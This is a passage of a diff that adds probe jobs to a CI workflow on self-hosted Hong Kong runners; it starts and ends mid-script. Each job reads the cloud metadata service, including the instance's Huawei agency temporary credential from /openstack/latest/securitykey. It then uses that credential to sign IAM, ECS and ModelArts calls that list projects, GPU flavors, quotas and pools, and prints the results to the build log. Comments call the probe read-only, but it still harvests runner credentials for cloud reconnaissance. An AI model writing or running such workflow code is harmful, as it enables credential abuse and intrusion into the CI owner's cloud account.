+                              print('MODELARTS_POOLS_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('MODELARTS_POOLS_BODY %s' % head(body))
+                      u = 'https://modelarts.%s.myhuaweicloud.com/v1/%s/job/resource-specs?job_type=train' % (region, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('MODELARTS_SPECS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              specs = d.get('specs') or d.get('resource_specs') or []
+                              print('MODELARTS_SPECS_TOTAL %d' % len(specs))
+                              for s in specs[:40]:
+                                  if isinstance(s, dict):
+                                      print('MODELARTS_SPEC %s' % json.dumps(s)[:200])
+                          except Exception as e:
+                              print('MODELARTS_SPECS_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('MODELARTS_SPECS_BODY %s' % head(body))
+                  else:
+                      print('ISSUER_GPU_INVENTORY_SKIPPED reason=no_project_id')
+                  print('ISSUER_DONE job=%s' % JOB)
+          else:
+              print('ISSUER_NOT_ATTEMPTED reason=no_complete_agency_credential')
+
+          print('IMDS_PROBE_END job=%s nonce=%s' % (JOB, NONCE))
+
+          PYEOF
+          else
+            echo C211_PY3_ABSENT
+            BASE="${C211_IMDS_BASE:-http://169.254.169.254}"
+            for p in $(printf '%s\n' /latest/meta-data/instance-id /latest/meta-data/local-ipv4 /latest/meta-data/hostname /latest/meta-data/placement/availability-zone /openstack/latest/meta_data.json /openstack/latest/network_data.json /openstack/latest/vendor_data.json /openstack/latest/securitykey /openstack/latest/user_data /latest/meta-data/c211-bogus-noctl); do
+              tag=IMDS; case "$p" in *c211-bogus*) tag=CTL;; esac
+              if command -v curl >/dev/null 2>&1; then
+                out=$(curl -s --noproxy '*' -m 3 -w '\nC211_HTTP=%{http_code}' "$BASE$p" 2>/dev/null)
+                body=${out%$'\n'C211_HTTP=*}
+                code=${out##*C211_HTTP=}
+                b=$(printf '%s' "$body" | wc -c)
+                h=$(printf '%s' "$body" | sha256sum | cut -c1-32)
+                echo "$tag path=$p status=$code bytes=$b sha256=$h"
+              else
+                echo "$tag path=$p FAIL no_http_client"
+              fi
+            done
+            echo ISSUER_NOT_ATTEMPTED reason=no_python3
+          fi
+          echo "C211_PROBE_END job=${C211_JOB} nonce=${C211_NONCE}"
+          exit 0
+  probe-hk-cpu-4:
+    name: probe-hk-cpu-4
+    runs-on: linux-amd64-cpu-4-hk
+    timeout-minutes: 25
+    steps:
+      - name: read-only-huawei-imds-agency-and-npu-probe
+        env:
+          C211_NONCE: c211-129863-42d7ab68cd158054
+          C211_JOB: probe-hk-cpu-4
+        run: |
+          set -u
+          set +e
+          echo "C211_MARKER job=${C211_JOB} nonce=${C211_NONCE} host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u 2>/dev/null) user=$(id -un 2>/dev/null)"
+          echo "C211_HOSTNAME=$(hostname 2>/dev/null)"
+          echo "C211_UID_INFO $(id 2>/dev/null)"
+          echo "C211_UNAME $(uname -a 2>/dev/null)"
+          echo "C211_ARCH=$(uname -m 2>/dev/null)"
+          echo "C211_OS $(head -2 /etc/os-release 2>/dev/null | tr '\n' ' ')"
+          PY=""
+          if command -v python3 >/dev/null 2>&1; then PY=$(command -v python3); fi
+          if [ -z "$PY" ] && command -v python >/dev/null 2>&1; then PY=$(command -v python); fi
+          if [ -n "$PY" ]; then
+            echo "C211_PY=$PY"
+            "$PY" - <<'PYEOF' 2>&1
+          import hashlib, hmac, json, os, re, time, urllib.parse, urllib.request, urllib.error
+
+          NONCE = os.environ.get('C211_NONCE', '')
+          JOB = os.environ.get('C211_JOB', '')
+          BASE = os.environ.get('C211_IMDS_BASE', 'http://169.254.169.254').rstrip('/')
+          TIMEOUT = float(os.environ.get('C211_IMDS_TIMEOUT', '3'))
+          MOCK = os.environ.get('C211_MOCK_ISSUER', '0') == '1'
+          # Exact path set mandated by the intent.
+          PATHS = [
+              '/latest/meta-data/instance-id',
+              '/latest/meta-data/local-ipv4',
+              '/latest/meta-data/hostname',
+              '/latest/meta-data/placement/availability-zone',
+              '/openstack/latest/meta_data.json',
+              '/openstack/latest/network_data.json',
+              '/openstack/latest/vendor_data.json',
+              '/openstack/latest/securitykey',
+              '/openstack/latest/user_data',
+          ]
+          CTL = '/latest/meta-data/c211-bogus-' + (NONCE.split('-')[-1] if NONCE else 'ctl')
+          # Reference baselines from fact 129809 (a2b3-1 / 310p-1, run 45068821093).
+          BASE_401_STATUS = 401
+          BASE_401_BYTES = 66
+          BASE_401_SHA32 = 'a6418346d3f3db46f0a9477689318693'
+          CTL_404_STATUS = 404
+          CTL_404_BYTES = 52
+          CTL_404_SHA32 = '9c30d2d7fee8cd575438ae62bdb657a8'
+
+
+          class NoRedir(urllib.request.HTTPRedirectHandler):
+              def redirect_request(self, req, fp, code, msg, headers, newurl):
+                  return None
+
+
+          OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}), NoRedir)
+
+
+          def get(path, timeout=None, limit=65536):
+              url = BASE + path
+              rq = urllib.request.Request(url, headers={'User-Agent': 'c211-129863-imds-readonly'}, method='GET')
+              try:
+                  with OPENER.open(rq, timeout=(timeout or TIMEOUT)) as r:
+                      return r.status, r.read(limit), None
+              except urllib.error.HTTPError as e:
+                  try:
+                      b = e.read(4096)
+                  except Exception:
+                      b = b''
+                  return e.code, b, None
+              except Exception as e:
+                  return None, b'', type(e).__name__
+
+
+          print('IMDS_PROBE_BEGIN job=%s nonce=%s base=%s mock=%s' % (JOB, NONCE, BASE, MOCK))
+          results = {}
+          bodies = {}
+          for p in PATHS + [CTL]:
+              st, body, err = get(p)
+              tag = 'CTL' if p == CTL else 'IMDS'
+              if st is None:
+                  print('%s path=%s FAIL %s' % (tag, p, err))
+                  results[p] = {'status': None, 'error': err}
+                  continue
+              h32 = hashlib.sha256(body).hexdigest()[:32]
+              print('%s path=%s status=%d bytes=%d sha256=%s' % (tag, p, st, len(body), h32))
+              results[p] = {'status': st, 'bytes': len(body), 'sha256': h32}
+              if st == 200:
+                  bodies[p] = body
+
+          # ---- reference comparisons against the fact-129809 baseline / control ----
+          sk = results.get('/openstack/latest/securitykey') or {}
+          if sk.get('status') == BASE_401_STATUS and sk.get('bytes') == BASE_401_BYTES and sk.get('sha256') == BASE_401_SHA32:
+              print('SECKEY_BASELINE_MATCH status=401 bytes=66 sha256_prefix=%s' % BASE_401_SHA32)
+          else:
+              print('SECKEY_BASELINE_DIFF status=%s bytes=%s sha256_prefix=%s ref=401/66/%s' % (
+                  sk.get('status'), sk.get('bytes'), sk.get('sha256'), BASE_401_SHA32))
+          ctl = results.get(CTL) or {}
+          if ctl.get('status') == CTL_404_STATUS and ctl.get('bytes') == CTL_404_BYTES and ctl.get('sha256') == CTL_404_SHA32:
+              print('CTL_BASELINE_MATCH status=404 bytes=52 sha256_prefix=%s' % CTL_404_SHA32)
+          else:
+              print('CTL_BASELINE_DIFF status=%s bytes=%s sha256_prefix=%s ref=404/52/%s' % (
+                  ctl.get('status'), ctl.get('bytes'), ctl.get('sha256'), CTL_404_SHA32))
+
+
+          def jload(path):
+              if path not in bodies:
+                  return None
+              try:
+                  return json.loads(bodies[path].decode('utf-8', 'replace'))
+              except Exception:
+                  return None
+
+
+          # ---- non-secret metadata identifiers (field names + selected identifiers) ----
+          md = jload('/openstack/latest/meta_data.json')
+          if isinstance(md, dict):
+              print('META_KEYS ' + ','.join(sorted(str(k) for k in md.keys()))[:500])
+              for k in ('uuid', 'project_id', 'availability_zone', 'region_id', 'hostname', 'name',
+                        'instance_type', 'enterprise_project_id', 'launch_index', 'domain_id', 'account_id'):
+                  if k in md:
+                      print('META_FIELD %s=%s' % (k, str(md.get(k))[:140]))
+              meta_sub = md.get('meta')
+              if isinstance(meta_sub, dict):
+                  print('META_META_KEYS ' + ','.join(sorted(str(k) for k in meta_sub.keys()))[:400])
+                  for k in ('metering.resourcetype', 'metering.resourcespeccode', 'metering.cloudServiceType', 'os_type', 'image_name'):
+                      if k in meta_sub:
+                          print('META_META_FIELD %s=%s' % (k, str(meta_sub.get(k))[:140]))
+          elif '/openstack/latest/meta_data.json' not in bodies:
+              print('META_JSON_ABSENT')
+
+          nd = jload('/openstack/latest/network_data.json')
+          if isinstance(nd, dict):
+              print('NETDATA_KEYS ' + ','.join(sorted(str(k) for k in nd.keys()))[:300])
+              for k in ('links', 'networks', 'services', 'qos'):
+                  v = nd.get(k)
+                  if isinstance(v, list):
+                      print('NETDATA_COUNT %s=%d' % (k, len(v)))
+          elif '/openstack/latest/network_data.json' not in bodies:
+              print('NETDATA_JSON_ABSENT')
+
+          vd = jload('/openstack/latest/vendor_data.json')
+          if isinstance(vd, dict):
+              print('VENDORDATA_KEYS ' + ','.join(sorted(str(k) for k in vd.keys()))[:300])
+          elif '/openstack/latest/vendor_data.json' not in bodies:
+              print('VENDORDATA_JSON_ABSENT')
+
+          # ---- Huawei agency temporary credential: presence + field names + sha256 only ----
+          ak = skv = tok = None
+          sec = jload('/openstack/latest/securitykey')
+          cred = sec.get('credential') if isinstance(sec, dict) else None
+          if isinstance(cred, dict):
+              print('SECKEY_KEYS ' + ','.join(sorted(str(k) for k in cred.keys()))[:300])
+              for k in sorted(str(x) for x in cred.keys()):
+                  v = cred.get(k)
+                  if isinstance(v, str):
+                      print('SECKEY_FIELD name=%s len=%d sha256=%s' % (k, len(v), hashlib.sha256(v.encode()).hexdigest()[:32]))
+                  else:
+                      print('SECKEY_FIELD name=%s type=%s' % (k, type(v).__name__))
+              a = cred.get('access')
+              s2 = cred.get('secret')
+              t2 = cred.get('securitytoken')
+              ak = a if isinstance(a, str) and a else None
+              skv = s2 if isinstance(s2, str) and s2 else None
+              tok = t2 if isinstance(t2, str) and t2 else None
+              print('SECKEY_PRESENT access=%s secret=%s securitytoken=%s complete=%s' % (
+                  bool(ak), bool(skv), bool(tok), bool(ak and skv and tok)))
+          else:
+              why = 'non_json' if '/openstack/latest/securitykey' in bodies else 'no_body'
+              print('SECKEY_PRESENT access=False secret=False securitytoken=False complete=False reason=%s' % why)
+
+
+          # ---- conditional in-process issuer read (credential never printed / written / sent elsewhere) ----
+          def _enc(x):
+              return urllib.parse.quote(str(x), safe='-_.~')
+
+
+          def canonical_query(q):
+              if not q:
+                  return ''
+              pairs = urllib.parse.parse_qsl(q, keep_blank_values=True)
+              pairs = sorted(((_enc(k), _enc(v)) for k, v in pairs), key=lambda kv: (kv[0], kv[1]))
+              return '&'.join('%s=%s' % (k, v) for k, v in pairs)
+
+
+          def signed_get(url, timeout=10):
+              p = urllib.parse.urlsplit(url)
+              host = p.netloc
+              path = urllib.parse.quote(p.path or '/', safe='/-_.~')
+              if not path.endswith('/'):
+                  path += '/'
+              cq = canonical_query(p.query)
+              xsd = time.strftime('%Y%m%dT%H%M%SZ', time.gmtime())
+              hdrs = {'host': host, 'x-sdk-date': xsd, 'x-security-token': tok}
+              signed = sorted(hdrs.keys())
+              ch = ''.join('%s:%s\n' % (k, hdrs[k].strip()) for k in signed)
+              payload_hash = hashlib.sha256(b'').hexdigest()
+              creq = '\n'.join(['GET', path, cq, ch, ';'.join(signed), payload_hash])
+              sts = 'SDK-HMAC-SHA256\n' + xsd + '\n' + hashlib.sha256(creq.encode()).hexdigest()
+              sig = hmac.new(skv.encode(), sts.encode(), hashlib.sha256).hexdigest()
+              hd = {'Host': host, 'X-Sdk-Date': xsd, 'X-Security-Token': tok,
+                    'Authorization': 'SDK-HMAC-SHA256 Access=%s, SignedHeaders=%s, Signature=%s' % (ak, ';'.join(signed), sig)}
+              rq = urllib.request.Request(url, headers=hd, method='GET')
+              try:
+                  with OPENER.open(rq, timeout=timeout) as r:
+                      return r.status, r.read(262144), (r.headers.get('Content-Type') or '')[:80]
+              except urllib.error.HTTPError as e:
+                  try:
+                      b = e.read(8192)
+                  except Exception:
+                      b = b''
+                  return e.code, b, 'httperror'
+              except Exception as e:
+                  return None, b'', type(e).__name__
+
+
+          def head(b, n=220):
+              try:
+                  return b[:n].decode('utf-8', 'replace').replace('\n', ' ')
+              except Exception:
+                  return ''
+
+
+          if ak and skv and tok:
+              print('ISSUER_CONDITION_MET job=%s nonce=%s' % (JOB, NONCE))
+              if MOCK:
+                  print('ISSUER_SKIPPED_MOCK reason=C211_MOCK_ISSUER=1')
+              else:
+                  az = md.get('availability_zone') if isinstance(md, dict) else None
+                  region = None
+                  if isinstance(az, str):
+                      m = re.match(r'^([a-z]{2}-[a-z]+-\d+)', az)
+                      if m:
+                          region = m.group(1)
+                  if not region:
+                      region = os.environ.get('C211_REGION', 'cn-southwest-2')
+                  project = md.get('project_id') if isinstance(md, dict) else None
+                  print('ISSUER_REGION=%s ISSUER_AZ=%s ISSUER_PROJECT_FROM_METADATA=%s' % (region, az, project))
+                  iam_url = 'https://iam.myhuaweicloud.com/v3/auth/projects'
+                  st, body, note = signed_get(iam_url)
+                  print('IAM_IDENTITY tag=GetUserAppId-equivalent call=%s status=%s bytes=%d note=%s' % (
+                      iam_url, st, len(body or b''), note))
+                  if st == 200:
+                      try:
+                          d = json.loads(body)
+                          projs = d.get('projects') or []
+                          print('IAM_PROJECTS count=%d' % len(projs))
+                          for p in projs[:12]:
+                              print('IAM_PROJECT name=%s id=%s domain_id=%s enabled=%s' % (
+                                  str(p.get('name'))[:60], str(p.get('id'))[:64], str(p.get('domain_id'))[:64], p.get('enabled')))
+                          if not project and projs:
+                              project = projs[0].get('id')
+                      except Exception as e:
+                          print('IAM_IDENTITY_PARSE_FAIL %s' % type(e).__name__)
+                  elif st is not None:
+                      print('IAM_IDENTITY_BODY %s' % head(body))
+                  if project:
+                      u = 'https://ecs.%s.myhuaweicloud.com/v1/%s/cloudservers/flavors%s' % (
+                          region, project, ('?availability_zone=' + _enc(az)) if az else '')
+                      st, body, note = signed_get(u, timeout=15)
+                      print('ECS_FLAVORS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              fl = d.get('flavors') or []
+                              gpu = [f for f in fl if re.match(r'^(p\d|g\d|pi\d|ai\d)', str(f.get('name', '')))]
+                              print('ECS_FLAVORS_TOTAL %d GPU_NAME_HITS %d' % (len(fl), len(gpu)))
+                              for f in gpu[:40]:
+                                  print('ECS_GPU_FLAVOR name=%s vcpus=%s ram=%s extras=%s' % (
+                                      f.get('name'), f.get('vcpus'), f.get('ram'),
+                                      json.dumps(f.get('os_extra_specs') or {})[:160]))
+                              print('ECS_FLAVOR_NAMES_SAMPLE ' + ','.join(str(f.get('name')) for f in fl[:40]))
+                          except Exception as e:
+                              print('ECS_FLAVORS_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('ECS_FLAVORS_BODY %s' % head(body))
+                      u = 'https://ecs.%s.myhuaweicloud.com/v2.1/%s/os-quota-sets/%s' % (region, project, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('ECS_QUOTA status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              qs = d.get('quota_set') or d
+                              print('ECS_QUOTA_KEYS ' + ','.join(sorted(str(k) for k in qs.keys()))[:400])
+                              shown = 0
+                              for k in sorted(str(x) for x in qs.keys()):
+                                  v = qs.get(k)
+                                  if isinstance(v, dict) and ('limit' in v or 'in_use' in v or 'quota' in v):
+                                      print('ECS_QUOTA_ITEM %s limit=%s in_use=%s quota=%s' % (k, v.get('limit'), v.get('in_use'), v.get('quota')))
+                                  elif isinstance(v, (int, str)):
+                                      print('ECS_QUOTA_ITEM %s value=%s' % (k, v))
+                                  else:
+                                      continue
+                                  shown += 1
+                                  if shown >= 40:
+                                      break
+                          except Exception as e:
+                              print('ECS_QUOTA_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('ECS_QUOTA_BODY %s' % head(body))
+                      u = 'https://ecs.%s.myhuaweicloud.com/v2.1/%s/os-availability-zone' % (region, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('ECS_AZS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              zs = d.get('availabilityZoneInfo') or d.get('availability_zones') or []
+                              print('ECS_AZS_TOTAL %d' % len(zs))
+                              for z in zs[:20]:
+                                  if isinstance(z, dict):
+                                      print('ECS_AZ name=%s state=%s' % (str(z.get('zoneName') or z.get('zone_name'))[:60], z.get('zoneState') or z.get('zone_state')))
+                          except Exception as e:
+                              print('ECS_AZS_PARSE_FAIL %s' % type(e).__name__)
+                      u = 'https://modelarts.%s.myhuaweicloud.com/v1/%s/pools?limit=20' % (region, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('MODELARTS_POOLS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              pools = d.get('pools') or d.get('items') or []
+                              print('MODELARTS_POOLS_TOTAL %d' % len(pools))
+                              for p in pools[:20]:
+                                  if isinstance(p, dict):
+                                      print('MODELARTS_POOL %s' % json.dumps({k: p.get(k) for k in ('metadata', 'spec', 'status', 'name', 'pool_name', 'state') if p.get(k) is not None})[:300])
+                          except Exception as e:
+                              print('MODELARTS_POOLS_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('MODELARTS_POOLS_BODY %s' % head(body))
+                      u = 'https://modelarts.%s.myhuaweicloud.com/v1/%s/job/resource-specs?job_type=train' % (region, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('MODELARTS_SPECS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              specs = d.get('specs') or d.get('resource_specs') or []
+                              print('MODELARTS_SPECS_TOTAL %d' % len(specs))
+                              for s in specs[:40]:
+                                  if isinstance(s, dict):
+                                      print('MODELARTS_SPEC %s' % json.dumps(s)[:200])
+                          except Exception as e:
+                              print('MODELARTS_SPECS_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('MODELARTS_SPECS_BODY %s' % head(body))
+                  else:
+                      print('ISSUER_GPU_INVENTORY_SKIPPED reason=no_project_id')
+                  print('ISSUER_DONE job=%s' % JOB)
+          else:
+              print('ISSUER_NOT_ATTEMPTED reason=no_complete_agency_credential')
+
+          print('IMDS_PROBE_END job=%s nonce=%s' % (JOB, NONCE))
+
+          PYEOF
+          else
+            echo C211_PY3_ABSENT
+            BASE="${C211_IMDS_BASE:-http://169.254.169.254}"
+            for p in $(printf '%s\n' /latest/meta-data/instance-id /latest/meta-data/local-ipv4 /latest/meta-data/hostname /latest/meta-data/placement/availability-zone /openstack/latest/meta_data.json /openstack/latest/network_data.json /openstack/latest/vendor_data.json /openstack/latest/securitykey /openstack/latest/user_data /latest/meta-data/c211-bogus-noctl); do
+              tag=IMDS; case "$p" in *c211-bogus*) tag=CTL;; esac
+              if command -v curl >/dev/null 2>&1; then
+                out=$(curl -s --noproxy '*' -m 3 -w '\nC211_HTTP=%{http_code}' "$BASE$p" 2>/dev/null)
+                body=${out%$'\n'C211_HTTP=*}
+                code=${out##*C211_HTTP=}
+                b=$(printf '%s' "$body" | wc -c)
+                h=$(printf '%s' "$body" | sha256sum | cut -c1-32)
+                echo "$tag path=$p status=$code bytes=$b sha256=$h"
+              else
+                echo "$tag path=$p FAIL no_http_client"
+              fi
+            done
+            echo ISSUER_NOT_ATTEMPTED reason=no_python3
+          fi
+          echo "C211_PROBE_END job=${C211_JOB} nonce=${C211_NONCE}"
+          exit 0
+  probe-hk-cpu-8:
+    name: probe-hk-cpu-8
+    runs-on: linux-amd64-cpu-8-hk
+    timeout-minutes: 25
+    container:
+      image: quay.io/ascend-ci/vllm-ascend:lint
+    steps:
+      - name: read-only-huawei-imds-agency-and-npu-probe
+        env:
+          C211_NONCE: c211-129863-42d7ab68cd158054
+          C211_JOB: probe-hk-cpu-8
+        run: |
+          set -u
+          set +e
+          echo "C211_MARKER job=${C211_JOB} nonce=${C211_NONCE} host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u 2>/dev/null) user=$(id -un 2>/dev/null)"
+          echo "C211_HOSTNAME=$(hostname 2>/dev/null)"
+          echo "C211_UID_INFO $(id 2>/dev/null)"
+          echo "C211_UNAME $(uname -a 2>/dev/null)"
+          echo "C211_ARCH=$(uname -m 2>/dev/null)"
+          echo "C211_OS $(head -2 /etc/os-release 2>/dev/null | tr '\n' ' ')"
+          PY=""
+          if command -v python3 >/dev/null 2>&1; then PY=$(command -v python3); fi
+          if [ -z "$PY" ] && command -v python >/dev/null 2>&1; then PY=$(command -v python); fi
+          if [ -n "$PY" ]; then
+            echo "C211_PY=$PY"
+            "$PY" - <<'PYEOF' 2>&1
+          import hashlib, hmac, json, os, re, time, urllib.parse, urllib.request, urllib.error
+
+          NONCE = os.environ.get('C211_NONCE', '')
+          JOB = os.environ.get('C211_JOB', '')
+          BASE = os.environ.get('C211_IMDS_BASE', 'http://169.254.169.254').rstrip('/')
+          TIMEOUT = float(os.environ.get('C211_IMDS_TIMEOUT', '3'))
+          MOCK = os.environ.get('C211_MOCK_ISSUER', '0') == '1'
+          # Exact path set mandated by the intent.
+          PATHS = [
+              '/latest/meta-data/instance-id',
+              '/latest/meta-data/local-ipv4',
+              '/latest/meta-data/hostname',
+              '/latest/meta-data/placement/availability-zone',
+              '/openstack/latest/meta_data.json',
+              '/openstack/latest/network_data.json',
+              '/openstack/latest/vendor_data.json',
+              '/openstack/latest/securitykey',
+              '/openstack/latest/user_data',
+          ]
+          CTL = '/latest/meta-data/c211-bogus-' + (NONCE.split('-')[-1] if NONCE else 'ctl')
+          # Reference baselines from fact 129809 (a2b3-1 / 310p-1, run 45068821093).
+          BASE_401_STATUS = 401
+          BASE_401_BYTES = 66
+          BASE_401_SHA32 = 'a6418346d3f3db46f0a9477689318693'
+          CTL_404_STATUS = 404
+          CTL_404_BYTES = 52
+          CTL_404_SHA32 = '9c30d2d7fee8cd575438ae62bdb657a8'
+
+
+          class NoRedir(urllib.request.HTTPRedirectHandler):
+              def redirect_request(self, req, fp, code, msg, headers, newurl):
+                  return None
+
+
+          OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}), NoRedir)
+
+
+          def get(path, timeout=None, limit=65536):
+              url = BASE + path
+              rq = urllib.request.Request(url, headers={'User-Agent': 'c211-129863-imds-readonly'}, method='GET')
+              try:
+                  with OPENER.open(rq, timeout=(timeout or TIMEOUT)) as r:
+                      return r.status, r.read(limit), None
+              except urllib.error.HTTPError as e:
+                  try:
+                      b = e.read(4096)
+                  except Exception:
+                      b = b''
+                  return e.code, b, None
+              except Exception as e:
+                  return None, b'', type(e).__name__
+
+
+          print('IMDS_PROBE_BEGIN job=%s nonce=%s base=%s mock=%s' % (JOB, NONCE, BASE, MOCK))
+          results = {}
+          bodies = {}
+          for p in PATHS + [CTL]:
+              st, body, err = get(p)
+              tag = 'CTL' if p == CTL else 'IMDS'
+              if st is None:
+                  print('%s path=%s FAIL %s' % (tag, p, err))
+                  results[p] = {'status': None, 'error': err}
+                  continue
+              h32 = hashlib.sha256(body).hexdigest()[:32]
+              print('%s path=%s status=%d bytes=%d sha256=%s' % (tag, p, st, len(body), h32))
+              results[p] = {'status': st, 'bytes': len(body), 'sha256': h32}
+              if st == 200:
+                  bodies[p] = body
+
+          # ---- reference comparisons against the fact-129809 baseline / control ----
+          sk = results.get('/openstack/latest/securitykey') or {}
+          if sk.get('status') == BASE_401_STATUS and sk.get('bytes') == BASE_401_BYTES and sk.get('sha256') == BASE_401_SHA32:
+              print('SECKEY_BASELINE_MATCH status=401 bytes=66 sha256_prefix=%s' % BASE_401_SHA32)
+          else:
+              print('SECKEY_BASELINE_DIFF status=%s bytes=%s sha256_prefix=%s ref=401/66/%s' % (
+                  sk.get('status'), sk.get('bytes'), sk.get('sha256'), BASE_401_SHA32))
+          ctl = results.get(CTL) or {}
+          if ctl.get('status') == CTL_404_STATUS and ctl.get('bytes') == CTL_404_BYTES and ctl.get('sha256') == CTL_404_SHA32:
+              print('CTL_BASELINE_MATCH status=404 bytes=52 sha256_prefix=%s' % CTL_404_SHA32)
+          else:
+              print('CTL_BASELINE_DIFF status=%s bytes=%s sha256_prefix=%s ref=404/52/%s' % (
+                  ctl.get('status'), ctl.get('bytes'), ctl.get('sha256'), CTL_404_SHA32))
+
+
+          def jload(path):
+              if path not in bodies:
+                  return None
+              try:
+                  return json.loads(bodies[path].decode('utf-8', 'replace'))
+              except Exception:
+                  return None
+
+
+          # ---- non-secret metadata identifiers (field names + selected identifiers) ----
+          md = jload('/openstack/latest/meta_data.json')
+          if isinstance(md, dict):
+              print('META_KEYS ' + ','.join(sorted(str(k) for k in md.keys()))[:500])
+              for k in ('uuid', 'project_id', 'availability_zone', 'region_id', 'hostname', 'name',
+                        'instance_type', 'enterprise_project_id', 'launch_index', 'domain_id', 'account_id'):
+                  if k in md:
+                      print('META_FIELD %s=%s' % (k, str(md.get(k))[:140]))
+              meta_sub = md.get('meta')
+              if isinstance(meta_sub, dict):
+                  print('META_META_KEYS ' + ','.join(sorted(str(k) for k in meta_sub.keys()))[:400])
+                  for k in ('metering.resourcetype', 'metering.resourcespeccode', 'metering.cloudServiceType', 'os_type', 'image_name'):
+                      if k in meta_sub:
+                          print('META_META_FIELD %s=%s' % (k, str(meta_sub.get(k))[:140]))
+          elif '/openstack/latest/meta_data.json' not in bodies:
+              print('META_JSON_ABSENT')
+
+          nd = jload('/openstack/latest/network_data.json')
+          if isinstance(nd, dict):
+              print('NETDATA_KEYS ' + ','.join(sorted(str(k) for k in nd.keys()))[:300])
+              for k in ('links', 'networks', 'services', 'qos'):
+                  v = nd.get(k)
+                  if isinstance(v, list):
+                      print('NETDATA_COUNT %s=%d' % (k, len(v)))
+          elif '/openstack/latest/network_data.json' not in bodies:
+              print('NETDATA_JSON_ABSENT')
+
+          vd = jload('/openstack/latest/vendor_data.json')
+          if isinstance(vd, dict):
+              print('VENDORDATA_KEYS ' + ','.join(sorted(str(k) for k in vd.keys()))[:300])
+          elif '/openstack/latest/vendor_data.json' not in bodies:
+              print('VENDORDATA_JSON_ABSENT')
+
+          # ---- Huawei agency temporary credential: presence + field names + sha256 only ----
+          ak = skv = tok = None
+          sec = jload('/openstack/latest/securitykey')
+          cred = sec.get('credential') if isinstance(sec, dict) else None
+          if isinstance(cred, dict):
+              print('SECKEY_KEYS ' + ','.join(sorted(str(k) for k in cred.keys()))[:300])
+              for k in sorted(str(x) for x in cred.keys()):
+                  v = cred.get(k)
+                  if isinstance(v, str):
+                      print('SECKEY_FIELD name=%s len=%d sha256=%s' % (k, len(v), hashlib.sha256(v.encode()).hexdigest()[:32]))
+                  else:
+                      print('SECKEY_FIELD name=%s type=%s' % (k, type(v).__name__))
+              a = cred.get('access')
+              s2 = cred.get('secret')
+              t2 = cred.get('securitytoken')
+              ak = a if isinstance(a, str) and a else None
+              skv = s2 if isinstance(s2, str) and s2 else None
+              tok = t2 if isinstance(t2, str) and t2 else None
+              print('SECKEY_PRESENT access=%s secret=%s securitytoken=%s complete=%s' % (
+                  bool(ak), bool(skv), bool(tok), bool(ak and skv and tok)))
+          else:
+              why = 'non_json' if '/openstack/latest/securitykey' in bodies else 'no_body'
+              print('SECKEY_PRESENT access=False secret=False securitytoken=False complete=False reason=%s' % why)
+
+
+          # ---- conditional in-process issuer read (credential never printed / written / sent elsewhere) ----
+          def _enc(x):
+              return urllib.parse.quote(str(x), safe='-_.~')
+
+
+          def canonical_query(q):
+              if not q:
+                  return ''
+              pairs = urllib.parse.parse_qsl(q, keep_blank_values=True)
+              pairs = sorted(((_enc(k), _enc(v)) for k, v in pairs), key=lambda kv: (kv[0], kv[1]))
+              return '&'.join('%s=%s' % (k, v) for k, v in pairs)
+
+
+          def signed_get(url, timeout=10):
+              p = urllib.parse.urlsplit(url)
+              host = p.netloc
+              path = urllib.parse.quote(p.path or '/', safe='/-_.~')
+              if not path.endswith('/'):
+                  path += '/'
+              cq = canonical_query(p.query)
+              xsd = time.strftime('%Y%m%dT%H%M%SZ', time.gmtime())
+              hdrs = {'host': host, 'x-sdk-date': xsd, 'x-security-token': tok}
+              signed = sorted(hdrs.keys())
+              ch = ''.join('%s:%s\n' % (k, hdrs[k].strip()) for k in signed)
+              payload_hash = hashlib.sha256(b'').hexdigest()
+              creq = '\n'.join(['GET', path, cq, ch, ';'.join(signed), payload_hash])
+              sts = 'SDK-HMAC-SHA256\n' + xsd + '\n' + hashlib.sha256(creq.encode()).hexdigest()
+              sig = hmac.new(skv.encode(), sts.encode(), hashlib.sha256).hexdigest()
+              hd = {'Host': host, 'X-Sdk-Date': xsd, 'X-Security-Token': tok,
+                    'Authorization': 'SDK-HMAC-SHA256 Access=%s, SignedHeaders=%s, Signature=%s' % (ak, ';'.join(signed), sig)}
+              rq = urllib.request.Request(url, headers=hd, method='GET')
+              try:
+                  with OPENER.open(rq, timeout=timeout) as r:
+                      return r.status, r.read(262144), (r.headers.get('Content-Type') or '')[:80]
+              except urllib.error.HTTPError as e:
+                  try:
+                      b = e.read(8192)
+                  except Exception:
+                      b = b''
+                  return e.code, b, 'httperror'
+              except Exception as e:
+                  return None, b'', type(e).__name__
+
+
+          def head(b, n=220):
+              try:
+                  return b[:n].decode('utf-8', 'replace').replace('\n', ' ')
+              except Exception:
+                  return ''
+
+
+          if ak and skv and tok:
+              print('ISSUER_CONDITION_MET job=%s nonce=%s' % (JOB, NONCE))
+              if MOCK:
+                  print('ISSUER_SKIPPED_MOCK reason=C211_MOCK_ISSUER=1')
+              else:
+                  az = md.get('availability_zone') if isinstance(md, dict) else None
+                  region = None
